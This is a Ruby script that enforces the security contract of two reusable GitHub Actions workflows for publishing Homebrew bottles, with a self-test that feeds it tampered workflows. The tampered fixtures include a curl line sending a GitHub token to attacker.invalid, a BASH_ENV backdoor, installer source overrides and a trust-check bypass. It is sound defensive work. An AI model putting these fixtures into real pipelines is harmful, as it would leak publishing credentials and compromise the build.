#!/usr/bin/env ruby
# frozen_string_literal: true

require "digest"
require "json"
require "yaml"

REPO_ROOT = File.expand_path("..", __dir__)
PUBLISHER_PATH = File.join(REPO_ROOT, ".github/workflows/reusable-homebrew-bottle-publish.yml")
MAINTENANCE_PATH = File.join(REPO_ROOT, ".github/workflows/reusable-homebrew-bottle-maintenance.yml")

def check(condition, message)
  raise message unless condition
end

def load_workflow(path)
  workflow = YAML.safe_load_file(path, aliases: false)
  check(workflow.is_a?(Hash), "#{File.basename(path)} is not a workflow mapping")
  workflow
end

def workflow_events(workflow)
  events = workflow.key?("on") ? workflow["on"] : workflow[true]
  check(events.is_a?(Hash), "workflow on: value is not a mapping")
  events
end

def values_for_key(node, wanted, values = [])
  case node
  when Hash
    node.each do |key, value|
      values << value if key.to_s == wanted
      values_for_key(value, wanted, values)
    end
  when Array
    node.each { |value| values_for_key(value, wanted, values) }
  end
  values
end

def deep_copy(value)
  Marshal.load(Marshal.dump(value))
end

def canonical_contract(value)
  case value
  when Hash
    value.keys.sort_by(&:to_s).to_h do |key|
      [key.to_s, canonical_contract(value.fetch(key))]
    end
  when Array
    value.map { |entry| canonical_contract(entry) }
  else
    value
  end
end

def step_contract_digest(steps)
  Digest::SHA256.hexdigest(JSON.generate(canonical_contract(steps)))
end

def expect_rejection(label)
  rejected = false
  begin
    yield
  rescue KeyError, RuntimeError
    rejected = true
  end
  check(rejected, "self-test accepted #{label}")
end

def workflow_jobs(workflow)
  jobs = workflow["jobs"]
  check(jobs.is_a?(Hash), "workflow jobs: value is not a mapping")
  jobs
end

def job_steps(job, name)
  steps = job["steps"]
  check(steps.is_a?(Array), "#{name} steps: value is not an array")
  check(steps.all? { |step| step.is_a?(Hash) }, "#{name} contains a non-mapping step")
  steps
end

def workflow_steps(workflow)
  workflow_jobs(workflow).values.flat_map do |job|
    job.is_a?(Hash) && job["steps"].is_a?(Array) ? job["steps"] : []
  end
end

def exact_permissions?(actual, expected)
  actual.is_a?(Hash) && actual.transform_keys(&:to_s) == expected
end

def check_common(workflow, label)
  mutable_actions = values_for_key(workflow, "uses").select do |value|
    value.is_a?(String) && !value.start_with?("./") &&
      !value.match?(%r{\A[^@\s]+@[0-9a-f]{40}\z})
  end
  check(mutable_actions.empty?,
        "#{label} executes mutable action refs: #{mutable_actions.join(', ')}")

  cache_uses = values_for_key(workflow, "uses").select do |value|
    value.is_a?(String) && value.downcase.match?(%r{\Aactions/cache(?:/restore)?@})
  end
  check(cache_uses.empty?, "#{label} consumes Actions cache state: #{cache_uses.join(', ')}")

  unsafe_runs = values_for_key(workflow, "run").select do |value|
    value.is_a?(String) && value.include?("${{")
  end
  check(unsafe_runs.empty?, "#{label} interpolates a GitHub expression into shell syntax")
  check(values_for_key(workflow, "secrets").empty?, "#{label} passes repository secrets")
end

def check_publisher(workflow)
  top_level_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_level_keys == %w[concurrency jobs name on],
        "publisher has unexpected top-level configuration")
  check(workflow["name"] == "Reusable Kandelo Homebrew bottle publish",
        "publisher name changed")
  expected_concurrency = {
    "group" => "kandelo-homebrew-bottle-publish-${{ inputs.tap-repository }}-" \
               "${{ inputs.release-tag || github.run_id }}",
    "cancel-in-progress" => false,
  }
  check(workflow["concurrency"] == expected_concurrency,
        "publisher concurrency contract changed")

  events = workflow_events(workflow)
  check(events.keys == ["workflow_call"], "publisher must only expose workflow_call")
  workflow_call = events.fetch("workflow_call")
  check(workflow_call.keys == ["inputs"], "publisher workflow_call contract changed")
  expected_inputs = {
    "kandelo-repository" => { "type" => "string", "default" => "Automattic/kandelo" },
    "kandelo-ref" => { "type" => "string", "default" => "main" },
    "tap-repository" => { "type" => "string", "default" => "Automattic/kandelo-homebrew" },
    "tap-ref" => { "type" => "string", "default" => "main" },
    "formulae" => { "type" => "string", "required" => true },
    "arches" => { "type" => "string", "default" => "wasm32" },
    "release-tag" => { "type" => "string", "default" => "" },
    "bottle-root-url" => { "type" => "string", "default" => "" },
    "sidecar-command" => {
      "type" => "string",
      "default" => "bash scripts/homebrew-generate-sidecars-from-env.sh",
    },
    "expected-cache-keys" => { "type" => "string", "default" => "" },
    "force" => { "type" => "boolean", "default" => false },
    "repair-only" => { "type" => "boolean", "default" => false },
    "dry-run" => { "type" => "boolean", "default" => false },
  }
  check(workflow_call["inputs"] == expected_inputs, "publisher inputs changed")

  jobs = workflow_jobs(workflow)
  check(jobs.keys.sort == %w[build-and-publish plan], "publisher has an unexpected job set")
  check(jobs.fetch("plan").keys.sort == %w[outputs runs-on steps],
        "publisher plan execution contract changed")
  check(jobs.fetch("plan")["runs-on"] == "ubuntu-latest",
        "publisher plan runner trust boundary changed")
  check(jobs.fetch("build-and-publish").keys.sort ==
        %w[if needs runs-on steps strategy timeout-minutes],
        "publisher build execution contract changed")
  check(!workflow.key?("permissions"), "reusable publisher requests workflow permissions")
  check(jobs.values.none? { |job| job.is_a?(Hash) && job.key?("permissions") },
        "reusable publisher requests job permissions")
  check_common(workflow, "reusable publisher")

  plan_steps = job_steps(jobs.fetch("plan"), "publisher plan")
  check(step_contract_digest(plan_steps) ==
        "7602b0626e66888f9e26ace944244608d77d01c2cdcf1f960eb21b5555f72119",
        "publisher plan step contract changed")
  validation_index = plan_steps.index { |step| step["name"] == "Validate caller trust boundary" }
  checkout_indices = plan_steps.each_index.select do |index|
    plan_steps[index]["uses"].to_s.downcase.start_with?("actions/checkout@")
  end
  check(validation_index == 0, "publisher trust validation must be the first plan step")
  check(!checkout_indices.empty? && validation_index < checkout_indices.min,
        "publisher does not validate caller trust before checkout")

  validation = plan_steps.fetch(validation_index)
  validation_env = validation["env"]
  check(validation_env.is_a?(Hash), "publisher trust validation lacks an env mapping")
  expected_validation_env = {
    "DRY_RUN" => "${{ inputs.dry-run }}",
    "KANDELO_REPOSITORY" => "${{ inputs.kandelo-repository }}",
    "KANDELO_REF" => "${{ inputs.kandelo-ref }}",
    "TAP_REPOSITORY" => "${{ inputs.tap-repository }}",
    "TAP_REF" => "${{ inputs.tap-ref }}",
    "BOTTLE_ROOT_URL" => "${{ inputs.bottle-root-url }}",
    "SIDECAR_COMMAND" => "${{ inputs.sidecar-command }}",
  }
  check(validation.keys.sort == %w[env name run shell] &&
        validation["name"] == "Validate caller trust boundary" &&
        validation["shell"] == "bash" &&
        validation_env == expected_validation_env,
        "publisher trust validation step mapping changed")
  validation_run = validation["run"].to_s
  check(Digest::SHA256.hexdigest(validation_run) ==
        "c946d88dc5265d23d67641d11598960e241f7677fe2b4d035b14d3c65fde4c06",
        "publisher trust validation script changed")
  check(validation_run.include?('[ "$KANDELO_REF" = "main" ]'),
        "publisher does not constrain write publication to Kandelo main")
  check(validation_run.include?('[ "$TAP_REF" = "main" ]'),
        "publisher does not constrain write publication to tap main")
  check(validation_run.include?('[ "$DRY_RUN" = "true" ]'),
        "publisher does not isolate the selected-ref dry-run path")
  required_predicates = [
    '[ "$KANDELO_REPOSITORY" = "Automattic/kandelo" ]',
    '[ "$TAP_REPOSITORY" = "Automattic/kandelo-homebrew" ]',
    '[ -z "$BOTTLE_ROOT_URL" ]',
    '[ "$SIDECAR_COMMAND" = "bash scripts/homebrew-generate-sidecars-from-env.sh" ]',
  ]
  required_predicates.each do |predicate|
    check(validation_run.include?(predicate), "publisher trust validation lacks #{predicate}")
  end

  expected_uses = [
    *Array.new(4, "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd"),
    "Homebrew/actions/setup-homebrew@1f8e202ffddf94def7f42f6fa3a482e821489f9c",
    "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25",
    "DeterminateSystems/magic-nix-cache-action@908b263ff629f4cc17666315b7fd3ec127c6244d",
    "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
  ].sort
  check(values_for_key(workflow, "uses").sort == expected_uses,
        "publisher action set or pin changed")

  publisher_steps = workflow_steps(workflow)
  homebrew_steps = publisher_steps.select do |step|
    step["uses"] == "Homebrew/actions/setup-homebrew@1f8e202ffddf94def7f42f6fa3a482e821489f9c"
  end
  expected_homebrew_step = {
    "name" => "Install Homebrew",
    "uses" => "Homebrew/actions/setup-homebrew@1f8e202ffddf94def7f42f6fa3a482e821489f9c",
  }
  check(homebrew_steps == [expected_homebrew_step],
        "Homebrew setup action mapping changed")

  nix_steps = publisher_steps.select do |step|
    step["uses"] == "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25"
  end
  expected_nix_step = {
    "name" => "Install Nix",
    "uses" => "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25",
    "with" => { "github-token" => "" },
  }
  check(nix_steps == [expected_nix_step], "Nix installer action mapping changed")

  magic_steps = publisher_steps.select do |step|
    step["uses"] == "DeterminateSystems/magic-nix-cache-action@908b263ff629f4cc17666315b7fd3ec127c6244d"
  end
  expected_magic_step = {
    "name" => "Cache Nix store + flake eval",
    "uses" => "DeterminateSystems/magic-nix-cache-action@908b263ff629f4cc17666315b7fd3ec127c6244d",
    "with" => { "use-gha-cache" => false, "use-flakehub" => false },
  }
  check(magic_steps == [expected_magic_step], "Magic Nix action mapping changed")

  expected_outputs = {
    "matrix" => "${{ steps.matrix.outputs.matrix }}",
    "abi" => "${{ steps.release.outputs.abi }}",
    "release-tag" => "${{ steps.release.outputs.release-tag }}",
    "bottle-root-prefix" => "${{ steps.release.outputs.bottle-root-prefix }}",
    "kandelo-sha" => "${{ steps.source-commits.outputs.kandelo-sha }}",
    "tap-sha" => "${{ steps.source-commits.outputs.tap-sha }}",
  }
  check(jobs.fetch("plan")["outputs"] == expected_outputs, "publisher plan outputs changed")
  build = jobs.fetch("build-and-publish")
  check(build["runs-on"] == "ubuntu-latest" && build["timeout-minutes"] == 1440,
        "publisher build runner or timeout changed")
  check(build["needs"] == ["plan"], "publisher build does not depend exactly on plan")
  check(build["if"] == "${{ needs.plan.outputs.matrix != '[]' }}",
        "publisher build condition bypasses the validated matrix")
  expected_strategy = {
    "fail-fast" => false,
    "matrix" => { "include" => "${{ fromJson(needs.plan.outputs.matrix) }}" },
  }
  check(build["strategy"] == expected_strategy,
        "publisher build strategy bypasses the validated plan output")
  build_steps = job_steps(build, "publisher build")
  check(step_contract_digest(build_steps) ==
        "23990a135f89246de344363ba915cb427d0afce02a29b1db7011b2f064f924c8",
        "publisher build step contract changed")

  plan_checkouts = plan_steps.select do |step|
    step["uses"].to_s.downcase.start_with?("actions/checkout@")
  end.map { |step| { "name" => step["name"], "with" => step["with"] } }
  expected_plan_checkouts = [
    {
      "name" => "Checkout Kandelo workflow source",
      "with" => {
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ inputs.kandelo-ref }}",
        "path" => "kandelo",
        "submodules" => false,
      },
    },
    {
      "name" => "Checkout tap",
      "with" => {
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ inputs.tap-ref }}",
        "path" => "tap",
      },
    },
  ]
  check(plan_checkouts == expected_plan_checkouts, "publisher plan checkout wiring changed")

  source_commit_steps = plan_steps.select { |step| step["name"] == "Resolve source commits" }
  check(source_commit_steps.length == 1, "publisher must resolve source commits exactly once")
  source_commit_step = source_commit_steps.first
  check(source_commit_step.keys.sort == %w[id name run shell] &&
        source_commit_step["id"] == "source-commits" &&
        source_commit_step["shell"] == "bash" &&
        Digest::SHA256.hexdigest(source_commit_step["run"].to_s) ==
          "c05aa8d02adf2380b8acf8dcb3a7e27341660cefe7600bb8d944daf384d83248",
        "publisher source-commit resolution changed")

  build_checkouts = build_steps.select do |step|
    step["uses"].to_s.downcase.start_with?("actions/checkout@")
  end.map { |step| { "name" => step["name"], "with" => step["with"] } }
  expected_build_checkouts = [
    {
      "name" => "Checkout tap",
      "with" => {
        "repository" => "${{ inputs.tap-repository }}",
        "ref" => "${{ needs.plan.outputs.tap-sha }}",
        "path" => "tap",
      },
    },
    {
      "name" => "Checkout Kandelo workflow source",
      "with" => {
        "repository" => "${{ inputs.kandelo-repository }}",
        "ref" => "${{ needs.plan.outputs.kandelo-sha }}",
        "path" => "kandelo",
        "submodules" => false,
      },
    },
  ]
  check(build_checkouts == expected_build_checkouts, "publisher build checkout wiring changed")
end

def check_maintenance(workflow)
  top_level_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_level_keys == %w[concurrency jobs name on],
        "maintenance has unexpected top-level configuration")
  check(workflow["name"] == "Reusable Kandelo Homebrew bottle maintenance",
        "maintenance name changed")
  expected_concurrency = {
    "group" => "kandelo-homebrew-bottle-maintenance-Automattic-kandelo-homebrew-" \
               "${{ inputs.release-tag || github.run_id }}",
    "cancel-in-progress" => false,
  }
  check(workflow["concurrency"] == expected_concurrency,
        "maintenance concurrency contract changed")

  events = workflow_events(workflow)
  check(events.keys == ["workflow_call"], "maintenance must only expose workflow_call")
  workflow_call = events.fetch("workflow_call")
  check(workflow_call.keys == ["inputs"], "maintenance workflow_call contract changed")
  expected_inputs = {
    "mode" => { "type" => "string", "default" => "rebuild" },
    "formulae" => { "type" => "string", "required" => true },
    "arches" => { "type" => "string", "default" => "wasm32" },
    "release-tag" => { "type" => "string", "default" => "" },
    "expected-cache-keys" => { "type" => "string", "default" => "" },
    "force" => { "type" => "boolean", "default" => false },
    "rollback-reason" => { "type" => "string", "default" => "" },
    "rollback-ref" => { "type" => "string", "default" => "" },
    "deleted-package-url" => { "type" => "string", "default" => "" },
    "deletion-reason" => { "type" => "string", "default" => "" },
  }
  check(workflow_call["inputs"] == expected_inputs, "maintenance inputs changed")
  check_common(workflow, "maintenance workflow")

  jobs = workflow_jobs(workflow)
  check(jobs.keys.sort == %w[rebuild-or-repair rollback],
        "maintenance has an unexpected job set")
  expected_uses = [
    "./.github/workflows/reusable-homebrew-bottle-publish.yml",
    "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
    "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
    "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25",
  ].sort
  check(values_for_key(workflow, "uses").sort == expected_uses,
        "maintenance action set or pin changed")
  rebuild = jobs.fetch("rebuild-or-repair")
  check(rebuild.keys.sort == %w[if permissions uses with] &&
        rebuild["if"] == "${{ inputs.mode == 'rebuild' || inputs.mode == 'repair-only' }}",
        "maintenance rebuild execution contract changed")
  expected_rebuild_permissions = { "contents" => "write", "packages" => "write", "actions" => "read" }
  check(exact_permissions?(rebuild["permissions"], expected_rebuild_permissions),
        "maintenance rebuild permissions are not exact")
  check(rebuild["uses"] == "./.github/workflows/reusable-homebrew-bottle-publish.yml",
        "maintenance rebuild does not call the reviewed publisher")
  expected_rebuild_with = {
    "kandelo-repository" => "Automattic/kandelo",
    "kandelo-ref" => "main",
    "tap-repository" => "Automattic/kandelo-homebrew",
    "tap-ref" => "main",
    "formulae" => "${{ inputs.formulae }}",
    "arches" => "${{ inputs.arches }}",
    "release-tag" => "${{ inputs.release-tag }}",
    "expected-cache-keys" => "${{ inputs.expected-cache-keys }}",
    "force" => "${{ inputs.force }}",
    "repair-only" => "${{ inputs.mode == 'repair-only' }}",
    "dry-run" => false,
  }
  check(rebuild.fetch("with") == expected_rebuild_with,
        "maintenance rebuild input wiring changed")

  rollback = jobs.fetch("rollback")
  check(rollback.keys.sort == %w[if permissions runs-on steps timeout-minutes] &&
        rollback["if"] == "${{ inputs.mode == 'rollback' }}" &&
        rollback["runs-on"] == "ubuntu-latest" &&
        rollback["timeout-minutes"] == 30,
        "maintenance rollback execution contract changed")
  expected_rollback_permissions = { "contents" => "write", "packages" => "read", "actions" => "read" }
  check(exact_permissions?(rollback["permissions"], expected_rollback_permissions),
        "maintenance rollback permissions are not exact")
  rollback_steps = job_steps(rollback, "maintenance rollback")
  check(step_contract_digest(rollback_steps) ==
        "7af666d90021b9b9b913bfe4810368d559062bfcabd09c7d880459b022ff3f42",
        "maintenance rollback step contract changed")
  checkout_steps = rollback_steps.select do |step|
    next unless step["uses"].to_s.downcase.start_with?("actions/checkout@")
    step
  end
  expected_checkout_steps = [
    {
      "name" => "Checkout tap",
      "uses" => "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
      "with" => {
        "repository" => "Automattic/kandelo-homebrew",
        "ref" => "main",
        "path" => "tap",
      },
    },
    {
      "name" => "Checkout Kandelo workflow source",
      "uses" => "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
      "with" => {
        "repository" => "Automattic/kandelo",
        "ref" => "main",
        "path" => "kandelo",
        "submodules" => false,
      },
    },
  ]
  check(checkout_steps == expected_checkout_steps,
        "maintenance rollback checkout mapping changed")
  maintenance_nix_steps = rollback_steps.select do |step|
    step["uses"] == "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25"
  end
  expected_maintenance_nix_step = {
    "name" => "Install Nix",
    "uses" => "DeterminateSystems/nix-installer-action@ef8a148080ab6020fd15196c2084a2eea5ff2d25",
    "with" => { "github-token" => "" },
  }
  check(maintenance_nix_steps == [expected_maintenance_nix_step],
        "maintenance Nix installer action mapping changed")

  record_step = rollback_steps.find do |step|
    step["name"] == "Record rollback without replacing last-green metadata"
  end
  check(!record_step.nil?, "maintenance rollback lacks the metadata step")
  record_env = record_step.fetch("env")
  {
    "KANDELO_HOMEBREW_FORMULA" => "${{ inputs.formulae }}",
    "KANDELO_HOMEBREW_ARCH" => "${{ inputs.arches }}",
    "KANDELO_HOMEBREW_RELEASE_TAG" => "${{ inputs.release-tag }}",
  }.each do |key, value|
    check(record_env[key] == value, "maintenance rollback has an unexpected #{key}")
  end
  record_run = record_step["run"].to_s
  %w[KANDELO_HOMEBREW_FORMULA KANDELO_HOMEBREW_ARCH KANDELO_HOMEBREW_RELEASE_TAG].each do |name|
    check(record_run.include?("$#{name}"), "maintenance rollback does not use #{name}")
  end
  [
    '[[ "$KANDELO_HOMEBREW_FORMULA" =~ ^[a-z0-9][a-z0-9._-]*$ ]]',
    'case "$KANDELO_HOMEBREW_ARCH" in',
    'wasm32|wasm64) ;;',
    '[[ "$KANDELO_HOMEBREW_RELEASE_TAG" =~ ^bottles-abi-v[1-9][0-9]*$ ]]',
  ].each do |validation|
    check(record_run.include?(validation), "maintenance rollback lacks #{validation}")
  end
end

def self_test(publisher, maintenance)
  fixture = YAML.safe_load(<<~YAML, aliases: false)
    on:
      workflow_dispatch: {}
    permissions: "write-all"
    jobs:
      unsafe:
        permissions:
          contents: "write"
        steps:
          - uses: >-
              actions/cache/restore@v4
          - run: >-
              echo "${{ inputs.formulae }}"
          - uses: actions/checkout@v6
  YAML
  check(workflow_events(fixture).key?("workflow_dispatch"), "self-test missed workflow_dispatch")
  check(fixture["permissions"] == "write-all", "self-test missed quoted write-all")
  check(fixture.dig("jobs", "unsafe", "permissions", "contents") == "write",
        "self-test missed quoted write permission")
  check(values_for_key(fixture, "uses").include?("actions/cache/restore@v4"),
        "self-test missed folded cache action")
  check(values_for_key(fixture, "run").first.include?("${{"),
        "self-test missed folded shell expression")
  check(values_for_key(fixture, "uses").include?("actions/checkout@v6"),
        "self-test missed unnamed checkout")
  expect_rejection("a mutable external action ref") do
    check_common(
      { "jobs" => { "unsafe" => { "steps" => [{ "uses" => "actions/checkout@v6.0.2" }] } } },
      "self-test workflow",
    )
  end

  expect_rejection("an extra publisher job") do
    mutated = deep_copy(publisher)
    mutated.fetch("jobs")["backdoor"] = { "uses" => "owner/repo/.github/workflows/write.yml@main" }
    check_publisher(mutated)
  end
  expect_rejection("publisher top-level environment injection") do
    mutated = deep_copy(publisher)
    mutated["env"] = { "BASH_ENV" => "/tmp/backdoor" }
    check_publisher(mutated)
  end
  expect_rejection("publisher concurrency cancellation") do
    mutated = deep_copy(publisher)
    mutated.fetch("concurrency")["cancel-in-progress"] = true
    check_publisher(mutated)
  end
  expect_rejection("an extra publisher input") do
    mutated = deep_copy(publisher)
    workflow_events(mutated).fetch("workflow_call").fetch("inputs")["command"] = {
      "type" => "string",
      "default" => "true",
    }
    check_publisher(mutated)
  end
  expect_rejection("direct publisher dispatch") do
    mutated = deep_copy(publisher)
    workflow_events(mutated)["workflow_dispatch"] = {}
    check_publisher(mutated)
  end
  expect_rejection("a pre-validation executable step") do
    mutated = deep_copy(publisher)
    mutated.dig("jobs", "plan", "steps").unshift({ "run" => "echo selected code" })
    check_publisher(mutated)
  end
  expect_rejection("short-circuited trust validation") do
    mutated = deep_copy(publisher)
    step = mutated.dig("jobs", "plan", "steps").first
    step["run"] = "exit 0\n#{step['run']}"
    check_publisher(mutated)
  end
  expect_rejection("continued trust-validation failure") do
    mutated = deep_copy(publisher)
    mutated.dig("jobs", "plan", "steps").first["continue-on-error"] = true
    check_publisher(mutated)
  end
  expect_rejection("an overridden trust-validation shell") do
    mutated = deep_copy(publisher)
    mutated.dig("jobs", "plan", "steps").first["shell"] = "bash -c 'exit 0' {0}"
    check_publisher(mutated)
  end
  expect_rejection("a self-hosted publisher plan") do
    mutated = deep_copy(publisher)
    mutated.dig("jobs", "plan")["runs-on"] = "self-hosted"
    check_publisher(mutated)
  end
  expect_rejection("a self-hosted publisher build") do
    mutated = deep_copy(publisher)
    mutated.dig("jobs", "build-and-publish")["runs-on"] = "self-hosted"
    check_publisher(mutated)
  end
  expect_rejection("a build detached from the validated plan") do
    mutated = deep_copy(publisher)
    build = mutated.dig("jobs", "build-and-publish")
    build.delete("needs")
    build["if"] = true
    check_publisher(mutated)
  end
  expect_rejection("an unreviewed plan checkout repository") do
    mutated = deep_copy(publisher)
    step = mutated.dig("jobs", "plan", "steps").find do |candidate|
      candidate["name"] == "Checkout Kandelo workflow source"
    end
    step.fetch("with")["repository"] = "unreviewed/attacker-code"
    check_publisher(mutated)
  end
  expect_rejection("an unreviewed build checkout ref") do
    mutated = deep_copy(publisher)
    step = mutated.dig("jobs", "build-and-publish", "steps").find do |candidate|
      candidate["name"] == "Checkout Kandelo workflow source"
    end
    step.fetch("with")["ref"] = "unreviewed-branch"
    check_publisher(mutated)
  end
  expect_rejection("an unpinned Homebrew setup action") do
    mutated = deep_copy(publisher)
    mutated.dig("jobs", "build-and-publish", "steps") << {
      "uses" => "Homebrew/actions/setup-homebrew@master",
    }
    check_publisher(mutated)
  end
  expect_rejection("a second cache-enabled Magic Nix action") do
    mutated = deep_copy(publisher)
    mutated.dig("jobs", "build-and-publish", "steps") << {
      "uses" => "DeterminateSystems/magic-nix-cache-action@908b263ff629f4cc17666315b7fd3ec127c6244d",
      "with" => { "use-gha-cache" => true, "use-flakehub" => true },
    }
    check_publisher(mutated)
  end
  expect_rejection("cache-enabled reviewed Magic Nix action") do
    mutated = deep_copy(publisher)
    step = mutated.dig("jobs", "build-and-publish", "steps").find do |candidate|
      candidate["uses"].to_s.start_with?("DeterminateSystems/magic-nix-cache-action@")
    end
    step.fetch("with")["use-gha-cache"] = true
    check_publisher(mutated)
  end
  expect_rejection("a Magic Nix source override") do
    mutated = deep_copy(publisher)
    step = mutated.dig("jobs", "build-and-publish", "steps").find do |candidate|
      candidate["uses"].to_s.start_with?("DeterminateSystems/magic-nix-cache-action@")
    end
    step.fetch("with")["source-url"] = "https://attacker.invalid/magic-nix-cache"
    check_publisher(mutated)
  end
  expect_rejection("a Nix installer source override") do
    mutated = deep_copy(publisher)
    step = mutated.dig("jobs", "build-and-publish", "steps").find do |candidate|
      candidate["uses"].to_s.start_with?("DeterminateSystems/nix-installer-action@")
    end
    step.fetch("with")["source-url"] = "https://attacker.invalid/nix-installer"
    check_publisher(mutated)
  end
  expect_rejection("an Actions cache restore") do
    mutated = deep_copy(publisher)
    mutated.dig("jobs", "build-and-publish", "steps") << {
      "uses" => "actions/cache/restore@v4",
    }
    check_publisher(mutated)
  end
  expect_rejection("a shell-interpolated GitHub expression") do
    mutated = deep_copy(publisher)
    mutated.dig("jobs", "build-and-publish", "steps") << {
      "run" => 'echo "${{ inputs.formulae }}"',
    }
    check_publisher(mutated)
  end
  expect_rejection("a static publisher token-exfiltration step") do
    mutated = deep_copy(publisher)
    mutated.dig("jobs", "build-and-publish", "steps") << {
      "name" => "Exfiltrate publisher token",
      "shell" => "bash",
      "run" => "curl -d \"$HOMEBREW_GITHUB_API_TOKEN\" https://attacker.invalid",
    }
    check_publisher(mutated)
  end
  expect_rejection("missing first-party repository validation") do
    mutated = deep_copy(publisher)
    step = mutated.dig("jobs", "plan", "steps").find do |candidate|
      candidate["name"] == "Validate caller trust boundary"
    end
    step["run"] = step["run"].sub("Automattic/kandelo", "untrusted/kandelo")
    check_publisher(mutated)
  end
  expect_rejection("maintenance secret inheritance") do
    mutated = deep_copy(maintenance)
    mutated.dig("jobs", "rebuild-or-repair")["secrets"] = "inherit"
    check_maintenance(mutated)
  end
  expect_rejection("an extra maintenance job") do
    mutated = deep_copy(maintenance)
    mutated.fetch("jobs")["backdoor"] = {
      "permissions" => { "contents" => "write" },
      "runs-on" => "ubuntu-latest",
      "steps" => [{ "run" => "true" }],
    }
    check_maintenance(mutated)
  end
  expect_rejection("maintenance top-level environment injection") do
    mutated = deep_copy(maintenance)
    mutated["env"] = { "BASH_ENV" => "/tmp/backdoor" }
    check_maintenance(mutated)
  end
  expect_rejection("an extra maintenance input") do
    mutated = deep_copy(maintenance)
    workflow_events(mutated).fetch("workflow_call").fetch("inputs")["tap-ref"] = {
      "type" => "string",
      "default" => "main",
    }
    check_maintenance(mutated)
  end
  expect_rejection("a self-hosted rollback") do
    mutated = deep_copy(maintenance)
    mutated.dig("jobs", "rollback")["runs-on"] = "self-hosted"
    check_maintenance(mutated)
  end
  expect_rejection("a maintenance Nix installer source override") do
    mutated = deep_copy(maintenance)
    step = mutated.dig("jobs", "rollback", "steps").find do |candidate|
      candidate["uses"].to_s.start_with?("DeterminateSystems/nix-installer-action@")
    end
    step.fetch("with")["source-url"] = "https://attacker.invalid/nix-installer"
    check_maintenance(mutated)
  end
  expect_rejection("a static maintenance push step") do
    mutated = deep_copy(maintenance)
    mutated.dig("jobs", "rollback", "steps") << {
      "name" => "Push unreviewed rollback",
      "shell" => "bash",
      "run" => "git -C tap push origin HEAD:main",
    }
    check_maintenance(mutated)
  end
  expect_rejection("removed rollback identifier validation") do
    mutated = deep_copy(maintenance)
    step = mutated.dig("jobs", "rollback", "steps").find do |candidate|
      candidate["name"] == "Record rollback without replacing last-green metadata"
    end
    step["run"] = step["run"].sub("wasm32|wasm64", "anything")
    check_maintenance(mutated)
  end
end

begin
  publisher = load_workflow(PUBLISHER_PATH)
  maintenance = load_workflow(MAINTENANCE_PATH)
  self_test(publisher, maintenance)
  check_publisher(publisher)
  check_maintenance(maintenance)
  puts "check-homebrew-publish-workflow-trust.rb: ok"
rescue KeyError, Psych::Exception, RuntimeError => e
  warn "check-homebrew-publish-workflow-trust.rb: #{e.message}"
  exit 1
end
